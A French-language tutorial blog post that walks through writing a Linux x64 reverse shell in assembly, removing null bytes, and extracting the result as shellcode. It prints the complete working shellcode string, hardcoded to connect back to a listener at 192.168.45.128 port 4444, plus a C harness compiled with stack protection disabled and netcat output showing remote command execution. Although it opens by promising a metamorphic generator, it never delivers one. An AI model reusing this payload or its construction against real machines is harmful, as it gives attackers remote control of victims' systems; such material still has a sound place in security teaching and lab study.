# Shellcode reverse shell generator Linux x64

Salut tout le monde !
Dans ce post, je vais vous montrer comment fabriquer votre propre générateur de shellcode métamorphique !
Ça peut sembler intimidant, mais honnêtement, ce n'est pas si compliqué que ça, je vous le promets ! :)

# Lexique : Le reverse shell

Un reverse shell est une technique de sécurité informatique permettant à un attaquant de prendre le contrôle d'une machine distante en établissant une connexion sortante depuis la machine compromise vers un serveur contrôlé par l'attaquant.

## Comment l'attaquant fait pour obtenir un reverse shell ?

Très souvent, cela implique de faire télécharger et exécuter un programme contenant du code malveillant, tel qu'un "shellcode" (on reviendra sur ce terme un peu plus tard), sur la machine cible. Ce code malveillant établit ensuite une connexion à distance vers un serveur contrôlé par l'attaquant.

Une fois la connexion établie, l'attaquant peut envoyer des commandes au système compromis comme s'il s'agissait de son propre terminal, tout en recevant la sortie de ces commandes.

Ce reverse shell permet ainsi d'exercer un contrôle quasi total sur la machine compromise. 😮

# Lexique : Le shellcode

Un shellcode, c’est une chaine de caractère qui représente du code exécutable. C’est tout :)

Prenons un exemple très simple : un programme en assembleur qui affiche “Hello World” dans la console :

```nasm
global _start

section .text

_start:
  mov rax, 1        ; write(
  mov rdi, 1        ;   STDOUT_FILENO,
  mov rsi, msg      ;   "Hello, world!\n",
  mov rdx, msglen   ;   sizeof("Hello, world!\n")
  syscall           ; );

  mov rax, 60       ; exit(
  mov rdi, 0        ;   EXIT_SUCCESS
  syscall           ; );

section .rodata
  msg: db "Hello, world!", 10
  msglen: equ $ - msg
```

Très rapidement, ce code va utiliser le syscall SYS_WRITE pour écrire sur le terminal (STDOUT) “Hello World” puis quitter le programme avec le code 0 (qui veut dire que tout c’est bien passé) en utilisant le syscall SYS_EXIT.

J’assemble mon code assembleur et j’utilise un linker permettant de créer un **exécutable.**

Et quand je l’exécute on voit que le message “Hello World” est bien affiché sur mon terminal : 

```nasm
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode/expl]
└─$ nasm -f elf64 -o hello.o hello.asm && ld -o hello hello.o 
                                                                                                                                                                                                           
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode/expl]
└─$ ./hello  
Hello, world!
```

Maintenant, pour récupérer ce fameux shellcode (la chaîne de caractère qui représente le code exécutable) je vais utiliser un outil qui s’appelle objdump : 

```nasm
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode/expl]
└─$ objdump -d hello                                  

hello:     format de fichier elf64-x86-64

Déassemblage de la section .text :

0000000000401000 <_start>:
  401000:       b8 01 00 00 00          mov    $0x1,%eax
  401005:       bf 01 00 00 00          mov    $0x1,%edi
  40100a:       48 be 00 20 40 00 00    movabs $0x402000,%rsi
  401011:       00 00 00 
  401014:       ba 0e 00 00 00          mov    $0xe,%edx
  401019:       0f 05                   syscall
  40101b:       b8 3c 00 00 00          mov    $0x3c,%eax
  401020:       bf 00 00 00 00          mov    $0x0,%edi
  401025:       0f 05                   syscall
```

Ce que l’on voit dans la première colonne sont les adresses qui correspondent à l’instruction assembleur (3ème colonne). La deuxième colonne représente ce que l’on appelle des OPCodes, ce sont les instructions assembleurs mais en binaire pour que le processeur puisse comprendre ce qu’il doit faire. Et ce sont ces OPCodes qui correspondent au shellcode une fois concaténé. On les sépare avec des “\x” pour représenter des caractère hexadécimaux et on a le shellcode complet pour afficher “Hello World” dans un terminal : 

```nasm
\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\xbe\x00\x20\x40\x00\x00\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05
```

Pas très dur finalement non ? 🙂

Un problème persiste : un shellcode ne doit pas contenir de null bytes "\x00" sous peine de ne pas être exécuté par votre programme. Pourquoi ? Parce que le null byte est utilisé pour terminer une chaîne de caractères en programmation. Ainsi, si votre shellcode est coupé en plein milieu par un null byte (\x00), le reste du shellcode ne sera pas interprété, ce qui entraînera un dysfonctionnement de votre programme.

Avant de se soucier des null bytes, rédigeons notre reverse shell en assembleur !

# Reverse shell en assembleur

Bon, maintenant que l'on sait ce qu'est un reverse shell, développons le notre !

Pour le choix du langage de programmation, il sera développé en assembleur ce qui facilite grandement l'élimination des null bytes. Contrairement à l'utilisation de langages comme le C ou Rust, où la manipulation des null bytes peut être plus complexe, l'assembleur me permet d'avoir un contrôle direct sur les instructions, simplifiant ainsi le processus de suppression des null bytes.

La méthode la plus simple et la plus courte pour créer un reverse shell sur un ordinateur tournant sous Linux 64 bits est d'utiliser la méthodologie suivante :

- On crée un socket, un **tunnel** où les informations vont transiter telles que : les commandes envoyées et leur retour. Pour ce faire on utilise le syscall **SYS_SOCKET**.
- On **connecte la machine victime au serveur contrôlé par l'attaquant**, le "listener", et on indique à l'ordinateur d'utiliser le socket (tunnel) pour faire transiter les informations vers le serveur de l'attaquant. Le syscall utiliser ici sera **SYS_CONNECT**.
- Une fois la connexion au serveur établie, on va alors faire une petite manipulation : tout ce qui est censé être affiché sur la machine victime (STDOUT) mais également ses entrées comme le fait d'écrire sur le clavier seront **redirigés vers le serveur de l'attaquant**. Concrètement, l'attaquant va se faire passer pour la victime en écrivant à sa place et en recevant le retour des commandes à sa place. Il va **dupliquer** ce qu'on appelle les "file descriptors" de la victime. On utilisera ici le syscall **SYS_DUP2**.
- Enfin, une fois la redirection / duplication des file descriptor faite, on va pouvoir **exécuter les commandes** envoyées par l'attaquant. On va "simuler" l'envoi de cette commande dans le terminal de la victime : **/bin//sh "commande_envoyé_par_l'attaquant"**. Pour pouvoir faire ceci, on utilise le syscall **SYS_EXECVE**.

Maintenant que la méthodologie est comprise, commençons par créer un socket !

## SYS_SOCKET

Pour créer un socket on doit utiliser le syscall SYS_SOCKET.

Pour savoir quelles sont les options nécessaires à chaque syscall j’utilise ces excellents sites : [https://x64.syscall.sh/](https://x64.syscall.sh/) et [https://man7.org/linux/man-pages/man2/](https://man7.org/linux/man-pages/man2/)

Pour faire fonctionner le syscall SYS_SOCKET voici les informations nécessaires : 

```nasm
mov rax, 41 ; RAX prends la valeur 41 (numéro du syscall SYS_SOCKET)
mov rdi, 2 ; RDI prends la valeur 2 pour le “domain” AF_INET (IPv4)
mov rsi, 1 ; RSI prends la valeur 1 pour le “socket type” SOCK_STREAM (socket de flux)
mov rdx, 6 ; RDX prends la valeur 6 pour le protocole utilisé = IPPROTO_TCP pour TCP. 
syscall ; On execute la fonction socket() pour créer un socket :)
```

Une fois le syscall exécuté, si tout c’est bien passé, un nouveau file descriptor pointant vers le tunnel venant d’être créer est stocké dans le registre RAX.

On va donc stocker ce file descriptor qui sera essentiel pour indiquer vers où les informations entrantes et sortantes vont transiter.

Je vais pour ce faire, utiliser un registre qui ne sera pas modifié pendant toute la durée de vie du programme et qui va représenter ce file descriptor pointant vers le socket : le registre r8.

```nasm
mov r8, rax
```

## SYS_CONNECT

On va ensuite connecter la machine victime au serveur distant contrôlé par l’attaquant en utilisant le syscall SYS_CONNECT :

```nasm
sub rsp, 8 ; On prépare un buffer de 8 octet sur la stack pour stocker la structure d'adresse
mov BYTE[rsp],0x2 ; On place le domaine 2 (AF_INET) dans le premier octet du buffer
mov WORD[rsp+0x2],0x5c11 ; On place le port 4444 en little-endian 
;4444 en héxa = 115c mais en assembleur on inverse tous les octets
mov DWORD[rsp+0x4], 0x802da8c0 ; Place l'adresse IP (192.168.45.128) en little-endian
mov rsi, rsp ; RSI prends une adresse vers une structure. 
;Ici la structure est sur la stack (RSP) donc RSI prends la valeur de l'adresse de RSP
mov rdx, 16 ;RDX prends la valeur 16 qui corresponds à la taille de la structure
push r8 ; On push sur la stack la valeur du file descriptor du socket
pop rdi ; On la récupère dans le registre RDI. Ici, RDI = file descriptor du socket
mov rax, 42 ; RAX prends la valeur 42 (numéro du syscall SYS_CONNECT)
syscall
```

A ce stade, si le programme fonctionne bien, lorsque l’on execute notre programme assembleur et qu’on lance un listener (netcat) sur un autre terminal, on reçoit ce message : 

```nasm
┌──(dropa㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.128] from (UNKNOWN) [192.168.45.128] 43262
```

L’ordinateur victime s’est bien connecté à notre listener.

Nous allons maintenant dupliquer et rediriger les trois file descriptor de Linux vers notre tunnel pour les rediriger vers le listener et vice versa.

## SYS_DUP2

Le file descriptor de l’entrée utilisateur (ce qui est saisi au clavier), qui est STDIN (0).

Le file descriptor de la sortie utilisateur (par exemple, ce qui est affiché dans le terminal), qui est STDOUT (1).

Le file descriptor des erreurs (par exemple, afficher que l’on a pas les droits nécessaires pour accéder à un fichier)  qui est STDERR (2).

Nous allons appeler trois fois l'appel système SYS_DUP2, à chaque fois avec un descripteur de fichier à dupliquer, vers notre socket. Cela aura pour effet de rediriger la sortie standard, l'entrée standard et les erreurs standard vers notre tunnel, permettant ainsi la communication avec notre listener :

```nasm
mov rax, 33 ; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
push r8 ; On push sur la stack la valeur du file descriptor du socket
pop rdi ; On la récupère dans le registre RDI. Ici, RDI = file descriptor du socket
xor rsi, rsi ; On XOR RSI avec lui même donc RSI = 0. Ici RSI = STDIN = 0
syscall

; A la fin de ce syscall, ce qu'il vient de ce passer :
; le file descriptor STDIN de la victime a été dupliqué et il prend maintenant la valeur 
; du file descriptor du socket. En d'autres termes, les entrées effectuées sur le serveur 
; contrôlé par l'attaquant sont désormais interprétées comme des entrées 
; faites par la victime sur son ordinateur compromis.

mov rax, 33 ; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
push r8
pop rdi
mov rsi, 1 ; RSI prends la valeur 1 qui vaut STDOUT (sortie utilisateur)
syscall
mov rax, 33 ; RAX prends la valeur 33 (numéro du syscall SYS_DUP2)
push r8
pop rdi
mov rsi, 2 ; RSI prends la valeur 2 qui vaut STDERR (affichage d'erreurs)
syscall
```

Parfait ! La redirection est faite, il ne nous reste plus qu’a exécuter les commandes envoyées par l’attaquant via son listener.

## SYS_EXECVE

On va donc utiliser l’appel système SYS_EXECVE pour exécuter ces commandes :

```nasm
xor rsi, rsi ; Efface RSI en le mettant à zéro
push rsi ; On push sur la stack un pointeur NULL pour les arguments de la fonction execve
mov rdi, 0x68732f2f6e69622f   ; Charge l'adresse de la chaîne "/bin//sh" dans RDI.
push rdi ; On push sur la stack l'adresse de la chaîne "/bin//sh"
push rsp ; On push l'adresse actuelle de la stack (pointeur vers la chaîne "/bin//sh")
pop rdi ; RDI récupère l'adresse de la chaîne "/bin//sh"
mov al, 59 ; RAX prends la valeur 59 (numéro du syscall SYS_EXECVE)
cdq ; Étend le signe de EAX vers EDX pour que RDX contienne 0
; Cela signifie qu'il n'y a pas d'arguments à passer à execve
syscall ; Appelle la fonction execve pour exécuter le shell "/bin//sh"
```

Après cette dernière étape, le reverse shell est prêt ! Testons le !

Je prépare un listener pour envoyer et lire le retour des commandes sur la machine compromise :

```bash
┌──(dropa㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

J’assemble et je link pour créer mon executable et je l’exécute sur la machine cible : 

```bash
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode]
└─$ nasm -f elf64 -o myShell.o myShell.asm && ld -o myShell myShell.o
                                                                                                    
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode]
└─$ ./myShell
```

Et une fois exécuté voila ce qu’on a :

```bash
┌──(dropa㉿kali)-[~]
└─$ nc -lnvp 4444 
listening on [any] 4444 ...
connect to [192.168.45.128] from (UNKNOWN) [192.168.45.128] 34276
whoami
dropa
pwd
/home/dropa/Bureau/articles/shellcode
```

Super le reverse shell fonctionne !

Il ne nous reste plus qu’à obtenir le shellcode et c’est fini non ?

# Retirer les null bytes

Essayons : 

```bash
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode]
└─$ objdump -d myShell

myShell:     format de fichier elf64-x86-64

Déassemblage de la section .text :

0000000000401000 <_start>:
  401000:       b8 29 00 00 00          mov    $0x29,%eax
  401005:       bf 02 00 00 00          mov    $0x2,%edi
  40100a:       be 01 00 00 00          mov    $0x1,%esi
  40100f:       ba 06 00 00 00          mov    $0x6,%edx
  401014:       0f 05                   syscall

```

Je n'ai inclus que la première partie du retour d'objdump, car on peut observer qu'il reste un grand nombre de null bytes, ces "fameux  “00” qui rendent notre shellcode inopérant.

Essayons de comprendre pourquoi nous avons des null bytes.

Dans la première instruction, initialement :

```nasm
mov rax, 29
```

Le programme doit transférer une valeur d'un octet, 29, dans un registre de 8 octets. Cependant, lors de l'assemblage, le compilateur NASM, confronté à cette situation, doit transférer la valeur dans un registre d'au moins 32 bits, soit 4 octets au minimum si ce n'est pas spécifié dans le code. C'est pourquoi l'instruction déplace d'abord 29 dans eax. Étant donné que 29 ne nécessite qu'un octet, les 3 octets restants du registre de 4 octets doivent être remplis. NASM les remplit avec des zéros, soit 3 octets remplis de null bytes, d'où "29 00 00 00" !

Maintenant que l’on sait pourquoi il y a des null bytes, comment les enlever ?

Il est simplement nécessaire de spécifier au code assembleur la taille de la valeur à déplacer. Par exemple, si vous souhaitez déplacer une valeur d'un octet, vous n'utiliserez qu'un seul octet des 8 disponibles dans le registre, et ainsi de suite.

Voici la correction : 

```nasm
; mov rax, 29 cette instruction génère 3 null bytes comme vu précédemment
mov al, 29 ; Ici on utilise AL, le dernier octet du registre RAX, 
           ; pour stocket 29, une valeur d'un  seul octet
```

Il suffit de faire ceci sur toutes les instructions “mov” de notre programme qui déplacent une valeur inférieure à 8 octet dans un registre complet.

Une fois ceci fait, nous allons juste rajouter ces instructions au tout début de notre programme : 

```nasm
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor rdi, rdi
xor rsi, rsi
```

Ceci permettra de mettre à 0 tous les registres nécessaires lors de l’exécution du shellcode pour qu’il puisse fonctionner sans problème.

Une fois ces deux modification faites, le shell code fonctionne toujours et surtout regardons si nous avons des null bytes !

```nasm
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode]
└─$ objdump -d myShell | grep '^ ' | cut -f2 | awk '{for(i=1;i<=NF;i++) printf "\\x%s",$i} END {print ""}' 
\xb0\x29\x40\xb7\x02\x40\xb6\x01\xb2\x06\x0f\x05\x49\x89\xc0\x48\x83\xec\x08\xc6\x04\x24
\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\xc0\xa8\x2d\x80\x48\x89\xe6\xb2\x10\x41
\x50\x5f\xb0\x2a\x0f\x05\xb0\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05\xb0\x21\x41\x50\x5f\x40
\xb6\x01\x0f\x05\xb0\x21\x41\x50\x5f\x40\xb6\x02\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62
\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

Aucun null byte ! Le shell code devrais donc fonctionner. Pour le tester voici le code C :

```c
#include <stdio.h>
#include <string.h>

int main(){
    char code[] = "\xb0\x29\x40\xb7\x02\x40\xb6....\x3b\x99\x0f\x05";
    printf("Shellcode length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    return ret();
}
```

On compile le code : 

```bash
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode]
└─$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

On lance le listener et le programme : 

```bash
┌──(dropa㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...

// Dans un autre terminal on exécute le programme contenant le shellcode

┌──(dropa㉿kali)-[~/Bureau/articles/shellcode]
└─$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode   
                                                                                                    
┌──(dropa㉿kali)-[~/Bureau/articles/shellcode]
└─$ ./shellcode                                                   
Shellcode length: 120
```

Et voici ce qu’il se passe au niveau du listener : 

```bash
┌──(dropa㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.128] from (UNKNOWN) [192.168.45.128] 47710
whoami
dropa
pwd
/home/dropa/Bureau/articles/shellcode

```

Ca fonctionne ! 🎉😎
